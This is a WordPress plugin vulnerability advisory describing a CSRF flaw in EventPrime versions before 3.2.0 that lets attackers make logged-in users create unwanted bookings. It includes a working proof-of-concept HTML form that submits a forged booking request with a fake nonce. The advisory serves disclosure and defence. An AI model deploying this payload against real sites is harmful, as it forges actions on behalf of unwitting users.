## WordPress Plugin Vulnerabilities

# EventPrime < 3.2.0 - Booking Creation via CSRF

### Description

The plugin does not have CSRF checks when creating bookings, which could allow attackers to make logged in users create unwanted bookings via CSRF attacks.

### Proof of Concept

Create an Event, noting its ID. Add a ticket type to the Event (the details don't matter).
As a logged-in user, visit a page with the following form, replace the event ID, and submit the form. Note that a new Booking is created, despite the incorrect nonce.
<html>
<body>
<form action="https://example.com/wp-admin/admin-ajax.php" method="POST">
<input type="text" name="action" value="ep\_save\_event\_booking" />
<textarea name="data">
ep\_event\_booking\_event\_id=EVENT\_ID&ep\_event\_booking\_user\_id=1&ep\_event\_booking\_total\_price=0&ep\_event\_booking\_total\_tickets=1&ep\_save\_event\_booking\_nonce=1234
</textarea>
<input type="submit" value="Submit request" />
</form>
</body>
</html>
